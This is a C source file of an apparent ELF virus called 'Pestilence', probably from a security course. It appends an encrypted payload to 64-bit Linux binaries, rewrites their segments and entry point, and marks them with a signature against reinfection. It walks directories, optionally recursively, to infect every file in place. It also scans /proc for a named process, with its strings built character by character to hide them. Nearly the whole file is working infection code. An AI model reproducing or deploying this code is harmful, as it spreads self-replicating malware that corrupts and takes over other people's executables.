#include "elf64.h"
#include <elf.h>
#include "infect.h"
#include <stdio.h>

//char KEY[16];
#define DATA 0x02

int get_sig(char *s, size_t n, size_t virus_len, char *sig)
{
	Elf64_Ehdr *h = (void*)s;
	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
	size_t sig_len = slen(sig);

	if (entry + virus_len >= n)
		return fail("invalid entry point");

	size_t i;
	size_t sig_sum = 0;;

	for (i = 0; i < virus_len; i++)
	{
		if (i == (size_t)(DATA + 7 * sizeof(size_t*)))
			i += sig_len;
		sig_sum += *(unsigned char*)(s + entry + i);
	}

	sig[sig_len - 8] = ((sig_sum / 1) % 10) + '0';
	sig[sig_len - 7] = ((sig_sum / 10) % 10) + '0';
	sig[sig_len - 6] = ((sig_sum / 100) % 10) + '0';
	sig[sig_len - 5] = ((sig_sum / 1000) % 10) + '0';
	sig[sig_len - 4] = ((sig_sum / 10000) % 10) + '0';
	sig[sig_len - 3] = ((sig_sum / 100000) % 10) + '0';
	sig[sig_len - 2] = ((sig_sum / 1000000) % 10) + '0';
	sig[sig_len - 1] = ((sig_sum / 10000000) % 10) + '0';

	return TRUE;
}

//======================= WOODY ==============================

void encrypt_block(uint32_t* v, uint32_t *k) {
	uint32_t v0=v[0], v1=v[1], sum=0, i;           /* initialisation */
	uint32_t delta=0x9e3779b9;                     /* constantes de clef */
	uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* mise en cache de la clef */
	for (i=0; i < 32; i++) {                       /* boucle principale */
		sum += delta;
		v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
		v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
	}
	v[0] = v0;
	v[1]=v1;
}

void encrypt(char *s, uint64_t n, uint32_t *k){
	for (uint64_t i = 0; i < n; i += 8){
		if (i + 8 < n){
			encrypt_block((uint32_t*)(s+i), k);
		}
	}
}

//=============================================================

static int _insert(char **s1, size_t *n1, size_t pos, char *s2, size_t n2){
	char *ns;
	//if ((ns = (char *)malloc((*n1) + n2)) == NULL)
	//	return FALSE;
	ns = (void*)CALL(SYS_mmap, NULL, (*n1) + n2, 6, 34, -1, 0);
	if (SYS_HAVE_FAIL(ns))
		return FALSE;
	size_t i,j,l;
	for (i = 0; i <= pos; i += 1){ ns[i] = (*s1)[i]; }
	for (j = 0; j < n2; j += 1){ns[i+j] = s2[j]; }
	for (l = 0; i+l < *n1; l += 1){ ns[i+j+l] = (*s1)[i+l]; }
	*s1 = ns;
	*n1 = (*n1) + n2;
	return TRUE;
}

static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
	//char *ns = (char *)malloc((*n) + add);
	char *ns = (void*)CALL(SYS_mmap, NULL, (*n) + add, 6, 34, -1, 0);
	if (SYS_HAVE_FAIL(ns))
		return ; // TODO
	size_t i,j,l;
	for (i = 0; i <= pos; i += 1){ ns[i] = (*s)[i]; }
	for (j = 0; j < add; j += 1){ns[i+j] = 0; }
	for (l = 0; i+l < *n; l += 1){ ns[i+j+l] = (*s)[i+l]; }
	//ffree(*s, *n);
	*s = ns;
	*n = (*n) + add;
}

void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt, char *s, size_t sn){
	//add a few information about himself
	Elf64_Ehdr *bh = (void*)b;
	size_t pos = 0/*elf_offset_entry(b, n)*/;
	//modifying 2bit after
	size_t *p = ((size_t *)(char*)(b + pos + DATA));
	p[0] = max(old_entry,entry) - min(old_entry,entry);
	struct s_opt *p_opt = (struct s_opt*)(((char *)b+DATA+8));
	*p_opt = opt;
	//p[1] = entry - pos;
	//printf("diff: %zx, size: %zx\n", entry - pos, n);
	//p[2] = n;
	//size_t ok = max(text_addr,entry) - min(text_addr,entry);
	//p[3]=ok;
	//p[4] = text_length;
	//inserting KEY
	p[3] = ((size_t*)key)[0];
	p[4] = ((size_t*)key)[1];
	*(unsigned char*)(p + 3) ^= 0b01110010;
	encrypt((char*)(p+5), 15, (uint32_t*)key);
	get_sig(s, sn, n, (char*)(p + 7));
}

static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
	Elf64_Ehdr *h = (void*)*s;
	Elf64_Phdr *ph = (*(void**)s) + h->e_phoff;

	size_t old_entry = h->e_entry;
	int x = elf_last_load_segment(*s, *n);
	if (ph[x].p_memsz < ph[x].p_filesz) return fail("corrupted binary");
	size_t diff = ph[x].p_memsz - ph[x].p_filesz;
	size_t oldn = 0;
	char *olds = NULL;
	if (diff > 0){
		//it means the segment will get bigger in mem, but we don't need that so we make it bigger in the file
		oldn = *n;
		olds = *s;
		_insert_zeros(s,n, ph[x].p_offset+ (ph[x].p_filesz == 0 ? 0 : ph[x].p_filesz - 1), diff);
		elf_shift_offset(*s, *n, ph[x].p_offset+ (ph[x].p_filesz == 0 ? 0 : ph[x].p_filesz - 1), diff);
		//reset it
		Elf64_Ehdr *h = (void*)*s;
		ph = (*(void**)s) + h->e_phoff;
		//change memsize to filesize
		ph[x].p_filesz += diff;
		ph[x].p_memsz = ph[x].p_filesz;
	}
	size_t pos = ph[x].p_offset + ph[x].p_filesz;
	size_t oldn2 = *n;
	char *olds2 = *s;
	_insert(s, n, pos-1, b, bn);
	encrypt(((*s) + pos + crypt_off), crypt_len, (uint32_t*)key);
	//reset it
	elf_shift_offset(*s, *n, pos, bn);
	elf_update_flags_of_load_segments(*s, *n);
	elf_change_size_last_load_segment(*s, *n, bn);
	elf_set_off_entry(*s, *n, pos);
	h = (void*)*s;
	update((*s) + pos, bn, old_entry, h->e_entry, opt, *s, *n);
	ffree(olds2, oldn2);
	if (olds)
		ffree(olds, oldn);
	return TRUE;
}

//=============================================================

int check_already_packed(char *s, size_t n, size_t virus_len){
	char sig[] = "Pestilence version 1.0 (c)oded by ndombre-agadhgad-AAAAAAAA";
	size_t sig_len = slen(sig);
	Elf64_Ehdr *h = (void*)s;
	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
	//check if size is enoug
	if (entry + DATA + 7*sizeof(size_t) + sig_len >= n)
		return TRUE;
	if (get_sig(s, n, virus_len, sig) == FALSE)
		return TRUE;
	size_t *p = ((size_t *)(char*)(s + entry + DATA));
	//print(sig);
	//print(p + 7);
	//print("\n");
	if (sncmp((char*)(p+7), sig, sig_len) == 0)
		return fail("already packed");
	return TRUE;
}

char *debug_name(char *fname){
	char *s = ft_malloc(slen(fname)+5);
	int x;
	for (x = 0; fname[x]; x++)
		s[x] = fname[x];
	s[x] = '.';
	s[x+1] = 'l';
	s[x+2] = 'o';
	s[x+3] = 'l';
	s[x+4] = '\0';
	return s;
}

int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
	char *s;
	size_t n;
	int ret = TRUE;

	if (!fget(fname, &s, &n))
	{
		fail("failed to open the file");
		goto fail;
	}
	if (elf_check_valid(s, n) == FALSE) goto fail;
	if (!check_already_packed(s, n, bn)) goto fail;

	//after insert, update data
	if (!_infect(&s,&n, b, bn, crypt_off, crypt_len, opt))
		goto fail;
	if (!fput(outname, s, n))
	{
		fail("failed to save to woody");
		goto fail;
	}

end:
	ffree(s, n);
	return ret;
fail:
	ret = FALSE;
	goto end;
}

int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
	//print("infecting directory:");
	//println(dirname);
	struct linux_dirent *d;
	char		p[4096];
	int		fd;

	if ((fd = ft_open(dirname, 65536, 0)) < 0) return fail("open dir");
	while (1)
	{
		int size = getdents(fd, p, sizeof(p));
		if (size == 0)
			break;
		if (size < 0)
		{
			ft_close(fd);
			return fail("read dir");
		}
		size_t x;
		for (x = 0; x < size; x += d->d_reclen){
			d = (struct linux_dirent*)(p + x);
			if (opt.do_recur && !str_equal(d->d_name, ".") && !str_equal(d->d_name, "..") &&  d_isdir(d)){
				char *t = ft_add_base(dirname, d->d_name);
				if (t == NULL)
					continue;
				infect_dir(t, b,bn,crypt_off,crypt_len,opt);
				ft_free(t);
			}
			else if (d_isfile(d)){
				char *t = ft_add_base(dirname, d->d_name);
				if (t == NULL)
					continue;
				infect(t, t, b, bn, crypt_off, crypt_len, opt);
				ft_free(t);
			}
		}
	}
	ft_close(fd);
}

int __attribute__((section (".textearly"))) cmpproc(char *name, int fd)
{
	size_t i = 0;
	ssize_t ret;
	char buff[1];
	while ((ret = ft_read(fd, buff, sizeof(buff))) >= 0)
	{
		if (ret == 0)
			return 1;
		if (name[i] == 0 && buff[0] == '\n')
			return 0;
		if (name[i] == 0)
			return 1;
		if (name[i] != buff[0])
			return 1;
		i++;
	}
	return -1;
}

int __attribute__((section (".textearly"))) check_prop(char *programe_name){
	struct linux_dirent *d;
	char		p[4096];
	char		proc[6];
	char		comm[5];
	int		fd;
	char		*buff;
	size_t		t;
	int		ret = TRUE;

	proc[0] = '/';
	proc[1] = 'p';
	proc[2] = 'r';
	proc[3] = 'o';
	proc[4] = 'c';
	proc[5] = '\0';
	comm[0] = 'c';
	comm[1] = 'o';
	comm[2] = 'm';
	comm[3] = 'm';
	comm[4] = '\0';
	if ((fd = ft_open(proc, 65536, 0)) < 0) return FALSE;
	while (ret == TRUE)
	{
		int size = getdents(fd, p, sizeof(p));
		if (size == 0)
			break;
		if (size < 0)
		{
			ft_close(fd);
			return FALSE;
		}
		size_t x;
		for (x = 0; x < size && ret == TRUE; x += d->d_reclen)
		{
			d = (struct linux_dirent*)(p + x);
			if (d_isdir(d) && is_number(d->d_name)){
				char *t1 = NULL;
				char *t2 = NULL;
				int fdproc = -1;
				if ((t1 = ft_add_base(proc, d->d_name)) == NULL)
					goto end;
				if ((t2 = ft_add_base(t1, comm)) == NULL)
					goto end;
				if ((fdproc = ft_open(t2, 0, 0)) < 0)
					goto end;
				if (cmpproc(programe_name, fdproc) == 0)
					ret = FALSE;
end:
				if (fd >= 0)
					ft_close(fdproc);
				if (t1 != NULL)
					ft_free(t1);
				if (t2 != NULL)
					ft_free(t2);
			}
		}
	}
	ft_close(fd);
	return (ret);
}
